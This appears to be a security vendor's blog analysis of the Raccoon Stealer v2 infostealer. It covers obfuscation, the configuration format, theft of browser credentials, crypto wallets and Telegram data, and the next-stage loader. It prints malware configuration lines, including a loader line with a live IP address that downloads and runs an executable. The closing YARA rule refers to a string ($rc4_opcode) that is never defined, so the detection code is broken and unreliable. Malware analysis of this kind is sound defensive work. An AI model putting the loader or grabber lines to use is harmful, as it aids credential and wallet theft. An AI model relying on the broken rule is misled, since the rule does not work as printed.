<h2 class="wp-block-heading" id="h-introduction">Introduction</h2>



<p class="has-medium-font-size">Raccoon is an information-stealing malware the likes of cryptocurrency wallet stealers such as AgentTesla, Formbook, Redline, and Vidar. In March 2022, Raccoon Team announced their temporary retirement due to missing team members related to the conflict between Ukraine and Russia that started in February 2022 on different forums (i.e. xss[.]is). They also mentioned they are working on a new version of the malware.</p>



<p class="has-medium-font-size">This blog post is a technical analysis of the new Raccoon Stealer 2.0 stand-alone version. Authors have announced that the malware is also available in a DLL format or could be embedded in other PE.</p>



<p class="has-medium-font-size">Link to the analyzed sample : <a href="https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/" target="_blank" rel="noreferrer noopener">https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/</a></p>



<p class="has-medium-font-size">This article follows up the <a href="https://blog.sekoia.io/raccoon-stealer-v2-part-1-the-return-of-the-dead/" target="_blank" rel="noreferrer noopener">first publication on Raccoon Stealer v2</a> to analyse in depth the malware functionalities and capabilities.</p>



<span id="more-1512"></span>



<h2 class="wp-block-heading" id="h-technical-overview">Technical overview</h2>



<p class="has-medium-font-size">Raccoon Stealer v2 is written in C/C++ and ASM, the standalone version is approximately 56 KB, malware obfuscates its configuration and strings. It also performs dynamic linking. Communication with its Command and Control servers occurs over HTTP; no encryption or data obfuscation is used to exchange with the attacker’s server.</p>



<p class="has-medium-font-size">Raccoon v2 targets various crypto wallets, retrieves cookies and saves credit card numbers from browsers (Edge, Firefox and Chrome). </p>



<h2 class="wp-block-heading" id="h-run-time-dynamic-linking">Run-time dynamic Linking</h2>



<p class="has-medium-font-size">The first task performed by the malware is to link libraries functions, initially the PE initiates handles to `Shell32.dll`, `WinInt.dll`, `Crypt32.dll`, `Ole32.dll`, `User32.dll`, `Advapi32.dll` and Kernel32.dll. Contrary to other malwares of the same family, Raccoon doesn&#8217;t hide the loading of `LoadLibrary` and `GetProcAddress` <a href="#ttp">[T1055.001]</a>, moreover imported functions from the various libraries are stored in clear text.</p>

<h2 class="wp-block-heading" id="h-obfuscation-techniques">Obfuscation techniques</h2>



<p class="has-medium-font-size">Once the functions are imported, Raccoon deobfuscates <a href="#ttp">[T1140]</a> a list of strings used to set up Command and Control communication, and exfiltration operations. This obfuscation technique is often implemented in <a href="https://blog.sekoia.io/mars-a-red-hot-information-stealer/" target="_blank" rel="noreferrer noopener">other malware</a>. The obfuscated strings are RC4-encrypted <a href="#ttp">[T1027]</a> strings stored in base64. The sample used two different RC4 keys, one for decrypting strings used later in the program and a second one to decrypt the list of C2.</p>

<h2 class="wp-block-heading" id="h-configuration-big-picture">Configuration big picture</h2>



<p class="has-medium-font-size">As introduced in the section `C2 communication initiation`, the sample obtains a configuration with a particular structure. Each line of the configuration, which is text-based, defines a type and how to collect information on the host. `wlts_` and `ews_` are prefixes used in the configuration, `wlts_` stands for wallets and `ews_` for browser web extension, as shown below by two configuration examples:</p>



<ul class="wp-block-list">
<li><code>ews_auromina:cnmamaachppnkjgnildpdmkaakejnhae;AuroWallet;Local Extension Settings</code></li>



<li><code>wlts_xmr:Monero;5;Monero\\wallets;*.keys;</code></li>
</ul>



<p class="has-medium-font-size">Configuration for browser extensions is defined by three values separated by semicolon: the browser extension directory name, the name and the type of extension, the extension type can be `Local Extension Settings` or `IndexedDB`.</p>



<p class="has-medium-font-size">Configuration for wallets is a bit more complex. Here the values are separated by a semicolon: the first value is the wallet name, the second value is an integer, the next values are files and/or directories pattern to search.</p>



<h2 class="wp-block-heading" id="h-stealing-functions-summary">Stealing functions summary</h2>



<p class="has-medium-font-size">The execution flow for the next functions is as follows (each step is detailed in the next sections of this article):</p>



<ol class="wp-block-list">
<li>Use sqlite3.dll to retrieve credit card information, cookies and saved passwords by browser (autofill) <a href="#ttp">[T1539]</a> <a href="#ttp">[T1555.003]</a>;</li>



<li>Use mozglue3.dll to get logins.json, cookies, and histories from Firefox <a href="#ttp">[T1539]</a> ;</li>



<li>Parse the received configuration to search for particular crypto wallets (<em>cf.</em>: `wlts_` and `ews_`)<a href="#ttp">[T1005]</a>; </li>



<li>Search file named `wallet.dat` <a href="#ttp">[T1005]</a>;</li>



<li>Grab files according to the pattern set in the configuration; [optional] <a href="#ttp">[T1119]</a></li>



<li>Investigate into the Telegram Desktop cache; [optional]</li>



<li>Capture a screenshot of the infected host desktop; [optional] <a href="#ttp">[T1113]</a></li>



<li>Load and execute the next stage. [optional] <a href="#ttp">[T1106]</a></li>
</ol>

<h2 class="wp-block-heading" id="h-file-grabber">File grabber</h2>



<p class="has-medium-font-size">In the configuration, the malware may receive the following line:</p>



<p class="has-medium-font-size"><code>grbr_:%USERPROFILE%\Desktop|.*txt`|*recycle*,*windows*|20|1|1|1|files&nbsp;</code></p>



<p class="has-medium-font-size">The above configuration indicates to the malware to look for all text files ( .txt) in the desktop folder <a href="#ttp">[T1083]</a> <a href="#ttp">[T1119]</a>. No particular operation is performed on the filename or its content. In case a file matches the given pattern, a copy is sent to the C2.</p>



<h2 class="wp-block-heading" id="h-telegram-cache-investigation">Telegram cache investigation</h2>



<p class="has-medium-font-size">The last stealing function used by Raccoon Stealer consists of investigating the Telegram Desktop cache data located under the `Telegram Desktop\tdata` directory.</p>



<p class="has-medium-font-size">The related configuration line is:</p>



<p class="has-medium-font-size"><code>tlgrm_Telegram:Telegram Desktop\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*</code></p>



<p class="has-medium-font-size">The `tdata` directory of the Telegram Desktop application is used to store the application cache where valuable data is stored, for instance session cookies.</p>

<h2 class="wp-block-heading" id="h-next-stage-loader">Next stage loader</h2>



<p class="has-medium-font-size">Finally, the malware ends up processing the configuration sent in the first HTTP response, by parsing its last line:</p>



<p class="has-medium-font-size"><code>ldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\|exe</code></p>



<p class="has-medium-font-size">This instruction pertains to the loader configuration, whose structure is `ldr_X:URL|execution directory|PE type`. This configuration is in charge of loading and executing the next stage <a href="#ttp">[T1106]</a> <a href="#ttp">[T1407]</a>. The payload choice is up to the actor who purchased Raccoon. In this analysis, the dropped and executed payload is a basic Trojan.</p>



<p class="has-medium-font-size">`X` is an integer whose value indicates which type of loading should be used:&nbsp;</p>



<ul class="wp-block-list">
<li>`3` indicates to execute the payload directly (no investigation done on this case due to the lack of sample matching this scenario);</li>



<li>`2` is not implemented;</li>



<li>`1` means the payload is located on a remote host and needs to be downloaded before being executed.</li>
</ul>

<h2 class="wp-block-heading" id="h-yara-rule">YARA rule</h2>



<p class="has-medium-font-size">As described in the obfuscation techniques section, the new version of Raccoon Stealer hides its strings and configuration using a very common technique (base64 encoded with RC4). The following <a href="https://blog.sekoia.io/playbooks-yara-rules-iocs-explanation-about-the-news/" target="_blank" rel="noreferrer noopener">YARA rule</a> matches the implemented RC4 decryption algorithm, and at least 20 occurrences, of the string deobfuscation routine.</p>



<pre class="wp-block-code"><code>rule infostealer_win_raccoon_v2_rc4 {
    meta:        
             malware = "Raccoon"
        description = "Finds samples of the Raccoon Stealer V2 based on the RC4 decryption algorithm and the deobfuscation routine"
        author = "SEKOIA.IO"

        modification_date = "2022-06-16"

    strings:

        $deobfuscation = {8d 4d ?? 51 50 8b ce e8 ?? ?? 00 00 8d 55 ?? a3 ?? ?? ?? ?? b9 ?? ?? ?? ?? e8 ?? ?? ff ff 57}
    
    condition:
        $rc4_opcode and #deobfuscation &gt; 20 and filesize &lt; 70KB   
}</code></pre>
